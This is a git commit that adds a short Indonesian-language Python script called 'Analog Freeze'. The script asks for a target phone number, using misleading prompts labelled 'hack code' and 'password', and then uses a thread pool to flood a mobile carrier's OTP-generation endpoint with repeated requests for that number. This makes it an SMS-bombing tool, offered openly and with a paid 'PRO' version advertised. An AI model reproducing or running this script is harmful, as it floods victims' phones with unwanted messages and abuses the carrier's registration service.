101d1756ec4b1cdf71e4cd648e58b95188f8fb93
CyberTuanTayo <56637732+TuanTayo@users.noreply.github.com>
2019-10-29 03:48:01 +0700

    Add files via upload

---
+++ src/analog.py
@@ -0,0 +1,42 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# Coded by TuanTayo
+"""
+mau beli versi PRO? email : cyber.tuantayo@gmail.com
+"""
+from multiprocessing.pool import ThreadPool
+try:
+	import os, time, requests, sys
+except ModuleNotFoundError:
+	print("\nSepertinya module requests BELUM Di Install")
+	print("$ pip install requests\n")
+	exit()
+
+banner=("""\033[1;36m
+\033[1;32mAnalog Freeze\033[1;36m
+\033[1;31mEmail=>cyber.tuantayo@gmail.com\033[1;36m
+\033[1;31mGithub=>https://github.com/TuanTayo
+""")
+
+os.system('clear')
+print(banner)
+no = input("\033[1;37mMasukan Code Hack >\033[1;32m")
+tot = int(input("\033[1;37mPassword >\033[1;32m"))
+spam = {'msisdn':no}
+idk = '200'
+def main(arg):
+	try:
+		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
+#		print(r.text)
+		if str(idk) in str(r.text):
+			print("\033[1;32m[v] SUKSES")
+		else:
+			print(r.text)
+			print("\033[1;31m[x] GAGAL")
+	except: pass
+
+jobs = []
+for x in range(tot):
+    jobs.append(x)
+p=ThreadPool(10)
+p.map(main,jobs)
